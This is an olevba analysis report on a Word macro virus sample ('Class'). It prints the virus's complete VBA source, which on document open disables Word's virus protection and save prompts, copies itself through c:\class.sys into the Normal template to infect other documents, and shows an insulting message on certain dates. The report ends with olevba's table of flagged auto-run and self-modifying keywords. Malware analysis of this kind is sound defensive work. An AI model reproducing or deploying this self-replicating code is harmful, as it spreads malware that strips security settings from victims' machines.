olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-eadb6cd6862888605cc57d498e2aedc5d4f34a38
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-eadb6cd6862888605cc57d498e2aedc5d4f34a38 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'PC COMPUTER6/9/99 1:45:16 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
On Error GoTo out
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
Options.VirusProtection = False
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
Options.SaveNormalPrompt = False
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
Options.ConfirmConversions = False
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
If nt > 70 And ad > 0 Then GoTo out
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
If nt < 70 Then
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
End If
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
host.codemodule.AddFromFile ("c:\class.sys")
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
With host.codemodule
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
    For x = 1 To 4
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
    .deletelines 1
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
    Next x
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
End With
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
If nt < 70 Then
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
    With host.codemodule
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
    .replaceline 1, "Sub AutoClose()"
'PC COMPUTER6/9/99 1:45:17 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
    .replaceline 71, "Sub ToolsMacro()"
'PC COMPUTER6/9/99 1:45:18 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
    End With
'PC COMPUTER6/9/99 1:45:18 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
End If
'PC COMPUTER6/9/99 1:45:18 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
With host.codemodule
'PC COMPUTER6/9/99 1:45:18 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
    For x = 2 To 72 Step 2
'PC COMPUTER6/9/99 1:45:18 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'PC COMPUTER6/9/99 1:45:18 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
    Next x
'PC COMPUTER6/9/99 1:45:18 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
End With
'PC COMPUTER6/9/99 1:45:18 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
out:
'PC COMPUTER6/9/99 1:45:18 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'PC COMPUTER6/9/99 1:45:18 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
End Sub
'PC COMPUTER6/9/99 1:45:18 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
Sub ViewVBCode()
'PC COMPUTER6/9/99 1:45:18 PMEpson FX-1170 on LPT1:Table 1 of popcomClippit
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

